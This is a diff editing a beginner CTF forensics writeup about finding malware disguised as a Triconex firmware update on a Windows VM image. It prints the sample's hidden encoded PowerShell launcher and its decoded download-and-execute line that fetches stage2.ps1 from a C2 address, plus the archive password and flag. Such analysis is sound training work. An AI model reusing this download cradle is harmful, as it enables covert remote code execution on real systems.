@@ -8,20 +8,9 @@
 
 ## Solution
 
-# PETCTF 2026 Prelim — Kerteh / "Infected Package [1/8]" — Beginner Writeup
+This writeup assumes you are new to CTFs and digital forensics. We will walk through exactly how to extract a massive virtual machine image, bypass heavy installation tools, mount the filesystem, find the malware, and decode the payload.
 
-> **Challenge folder:** `Kerteh/1 - Infected Package`
-> **Category:** Forensics
-> **Files given:** `Kerteh-EWS-07.7z` (4.2 GB)
-> **Archive password:** `PCTF@2026!` (from challenge description)
-> **Flag format:** `PETRONAS{...}`
-> **Final Flag:** `PETRONAS{USB_DR0P_1N1T14L_4CC3SS}`
-
-This writeup assumes you are new to CTFs and digital forensics. We will walk through exactly how to extract a massive virtual machine image, bypass heavy installation tools, mount the filesystem, find the malware, and decode the payload. 
-
----
-
-## 1. Challenge Overview
+### 1. Challenge Overview
 
 The challenge description gives us the exact profile of what we are looking for:
 > *"The intrusion started with something physical. Somewhere on this workstation, the first link in the chain is still sitting in plain sight - but its true intent isn't obvious at first glance."*
@@ -33,9 +22,7 @@ The challenge description gives us the exact profile of what we are looking for:
 
 The archive contains **4.2 GB** of data. It is definitely a virtual machine image (OVA/VMDK) of the compromised workstation.
 
----
-
-## 2. Step 1 — Extracting the Massive Archive
+### 2. Step 1 — Extracting the Massive Archive
 
 We are provided with the password in the challenge description: `PCTF@2026!`. 
 
@@ -46,9 +33,7 @@ Because the password contains an exclamation mark (`!`), it can trigger history 
 ```
 *(This will take a minute or two as it extracts a 4.5 GB `.ova` file).*
 
----
-
-## 3. Step 2 — Extracting the Virtual Disk
+### 3. Step 2 — Extracting the Virtual Disk
 
 An `.ova` (Open Virtual Appliance) file is simply a `tar` archive that contains the virtual machine's configuration and hard drive.
 
@@ -58,7 +43,7 @@ tar -xvf Kerteh-EWS-07.ova
 ```
 *You will see it extracted a `.vmdk` file (e.g., `Kerteh-EWS-07-disk001.vmdk`). This is the actual virtual hard drive.*
 
-### ⚠️ The Beginner Trap: `guestmount` and `qemu`
+**The Beginner Trap: `guestmount` and `qemu`**
 Many forensics tutorials will tell you to install `libguestfs-tools` or `qemu-system` to mount the VMDK. On a Kali VM inside VMware, this will often take 20+ minutes to install and might fail due to nested virtualization settings. 
 
 **The Pro-Tip:** `7-Zip` natively understands VMDK and NTFS filesystems! We can extract the entire Windows filesystem directly using `7z`, no installation required.
@@ -68,9 +53,7 @@ Many forensics tutorials will tell you to install `libguestfs-tools` or `qemu-sy
 ```
 *(This will extract the Windows drive into a folder named `extracted_vm`. It takes about a minute).*
 
----
-
-## 4. Step 3 — Triage of the Windows Filesystem
+### 4. Step 3 — Triage of the Windows Filesystem
 
 Now we have a fully readable Windows file system. Let's look at the users:
 ```bash
@@ -94,9 +77,7 @@ drwxrwxr-x  2 kali kali 4096 Nov 11 04:55 Triconex_FW_Update_v4.3
 
 The folder **`Triconex_FW_Update_v4.3`** stands out immediately. Triconex is a real industrial control system, and attackers love to disguise malware as "Firmware Updates." 
 
----
-
-## 5. Step 4 — Finding the Malware
+### 5. Step 4 — Finding the Malware
 
 Let's look inside the suspicious firmware folder:
 ```bash
@@ -121,9 +102,7 @@ powershell -WindowStyle Hidden -EncodedCommand JABjADIAPQAiAGgAdAB0AHAAOgAvAC8AM
 
 The attacker is using a classic malware technique: `-EncodedCommand`. This hides the PowerShell script in Base64 to evade detection.
 
----
-
-## 6. Step 5 — Decoding the Payload
+### 6. Step 5 — Decoding the Payload
 
 PowerShell's `-EncodedCommand` specifically uses **Base64 encoded UTF-16LE** text. If you just decode it as standard Base64, it will look like gibberish.
 
@@ -138,18 +117,9 @@ echo "JABjADIAPQAiAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAxADQAMQAuADIANwAuADkAMwAiADsAJA
 $c2="http://185.141.27.93"; $s=New-Object Net.WebClient; IEX($s.DownloadString("$c2/stage2.ps1")); # PETRONAS{USB_DR0P_1N1T14L_4CC3SS}
 ```
 
----
-
-## 7. The Flag
-
 The malware is designed to connect to a Command & Control (C2) server and download the next stage. However, the challenge author left the flag hidden in a comment at the very end of the script.
 
-**Flag:**
-`PETRONAS{USB_DR0P_1N1T14L_4CC3SS}`
-
----
-
-## 8. Cheat Sheet — Commands Used
+### 7. Cheat Sheet — Commands Used
 
 ```bash
 # 1. Extract the 7z Archive (use single quotes for the !)
